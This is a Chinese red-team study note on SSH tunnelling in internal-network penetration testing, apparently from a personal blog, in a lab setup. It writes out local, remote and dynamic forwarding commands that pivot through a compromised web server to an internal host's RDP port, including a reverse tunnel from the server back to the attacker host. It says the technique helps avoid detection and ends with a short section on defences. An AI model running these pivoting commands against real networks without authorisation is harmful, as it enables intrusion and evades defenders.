---
title: 【内网学习笔记】SSH 隧道使用学习
date: 2021-06-04 15:40:36
id: 210604-154036
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh4.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

# 0x00 前言

SSH 全称 `Secure Shell`，从它的名字来看这个协议就比较安全。SSH 协议是一种应用层协议，支持几乎所有 UNIX、Linux 平台。

得益于 SSH 协议在传输过程中都是加密，所以在流量层面也较难区分合法的 SSH 流量和攻击者产生的 SSH 流量。

因此在内网渗透过程中，使用 SSH 协议进行建立隧道的方法，一方面不用自己再上传同类工具，另一方面降低了因上传使用了同类工具被管理员发现的风险。

# 0x01 SSH 常用命令介绍

相信各位平时最常使用的 SSH 命令就是拿来连接 Linux 系统了，命令一般是这样：

```
ssh root@192.168.1.1
```

或者 -p 指定自己自定义的 SSH 端口、-i 指定自己的私钥文件等等。

如果拿 SSH 来创建隧道则需要用到下面的命令：

```
 -C 压缩传输，提高传输速度。
 -f 将 SSH 传输转入后台执行，不占用当前 shell
 -N 建立静默连接（建立了连接但看不到具体会话）
 -g 允许远程主机连接本地用于转发的端口。
 -L 本地端口转发
 -R 远程端口转发
 -D 动态转发（ SOCKS 代理）
 -p 指定 SSH 端口
```

# 0x02 本地转发

目前有这样的一个环境，外网有一台攻击主机 ，可访问处于内网环境的 Web 服务器（双网卡），但无法访问 Web 服务器所在内网的办公主机，接下来就用 SSH 进行流量转发，使外网的攻击主机通过 Web 服务器访问到位于内网的办公主机。

环境拓扑如下：

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh1.jpg)

在攻击主机上执行以下命令，将内网办公主机的 3389 端口映射到自己的 3388 端口上

```
ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP
```

```# ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5
> ssh -CfNg -L 3388:192.168.7.110:3389 root@172.16.214.5
root@172.16.214.5's password:
```

这条命令的意思就是将 Web 服务器 172.16.214.5 作为跳板，将内网办公主机的 3389 端口转发到攻击主机的 3388 端口，这样只要访问攻击主机的 3388 端口就会访问到内网办公主机的 3389 端口了。

为了判断代理转发是否建立成功，可以通过 `netstat` 进行判断

```
netstat -pantu | grep "3388"
```

```netstat -pantu | grep "3388"
> netstat -pantu | grep "3388"
tcp        0      0 0.0.0.0:3388            0.0.0.0:*               LISTEN      14086/ssh
tcp6       0      0 :::3388                 :::*                    LISTEN      14086/ssh
```

可以看到 ssh 程序已经监听 3388 端口了，接下来连接本地的 3388 端口就可以连接到内网办公主机的 3389 端口了

```
rdesktop 127.0.0.1:3388
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh2.png)

# 0x03 远程转发

远程转发在这里其实也可以说是反向代理，目前有这样的一个环境：内网中不存在边界设备，但是内网的 Web 服务器能访问到攻击主机，而内网的办公主机则不行。

因此可以在拿到 Web 服务器的 Shell 后，采用远程转发的方式，即利用 Web 服务器 SSH 连接到攻击主机上进行代理转发，然后访问攻击主机的端口即可，拓扑图如下：

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh3.jpg)

将 Web 服务器作为跳板，进行远程转发

```
ssh -CfNg -R 攻击主机端口:内网办公主机IP:内网办公主机端口 攻击主机ssh用户名@攻击主机IP
```

```
> ssh -CfNg -R 3388:192.168.7.110:3389 root@172.16.214.48
root@172.16.214.48's password:
```

同样的，为了判断代理转发是否建立成功，也可以通过 `netstat` 进行判断，和之前一样都是在攻击主机下执行下面的命令

```
netstat -pantu | grep "3388"
```

```
> netstat -pantu | grep "3388"
tcp        0      0 127.0.0.1:3388          0.0.0.0:*               LISTEN      24728/sshd: root
tcp6       0      0 ::1:3388                :::*                    LISTEN      24728/sshd: root
```

可以看到，同样的，在攻击主机上 3388 端口的监听已经被开启了，此时直接在攻击主机上访问 127.0.0.1:3388 就可以连接到 192.168.7.110:3389 了

```
rdesktop 127.0.0.1:3388
```

# 0x04 动态转发

动态转发需要攻击主机能够访问到目标主机，因此这里采用和本地转发一样的拓扑进行演示。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh1.jpg)

在攻击主机上执行下面的命令

```
ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP
```

```
> ssh -CfNg -D 4444 root@172.16.214.5
root@172.16.214.5's password:
```

使用 `netstat` 可以看到现在 4444 端口已经被监听了

```
netstat -pantu | grep "4444"
```

```
> netstat -pantu | grep "4444"
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      3979/ssh
tcp6       0      0 :::4444                 :::*                    LISTEN      3979/ssh
```

动态转发其实就是建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问，例如这里以 proxychains 为例，借助 proxychains 从攻击主机访问到内网的办公主机的 3389 端口。

在 kali 上如果没有自带 proxychains，可以直接使用 `sudo apt install proxychains` 进行安装，安装完成后，需要修改 proxychains 的配置文件

```
vim /etc/proxychains4.conf
```

来到配置文件最后一行，如果有之前配置好的代理，可以用 # 号注释掉，然后另起一行添加上我们的代理，添加内容为：

```
socks5 127.0.0.1 4444
```

修改后之后，按下`esc`，然后按下`:wq` 保存退出

之后使用下面的命令连接内网办公主机 192.168.7.110 的 3389 端口。

```
proxychains4 rdesktop 192.168.7.110:3389 
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/ssh4.png)

可以看到动态转发要比本地转发自由度高出不少，借助动态转发可以访问到内网 Web 服务器能访问的所有地址、端口，没有了本地转发只能访问单个IP、端口的限制。

# 0x05 SSH 隧道攻击的防御

对 SSH 进行双向访问控制策略可以避免这些问题，一方面只允许可信 IP 才能连接，一方面只允许连接到可信 IP。

> 参考文章：
>
> [https://baike.baidu.com/item/SSH/10407](https://baike.baidu.com/item/SSH/10407)
>
> [https://zhuanlan.zhihu.com/p/174782978](https://zhuanlan.zhihu.com/p/174782978)
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)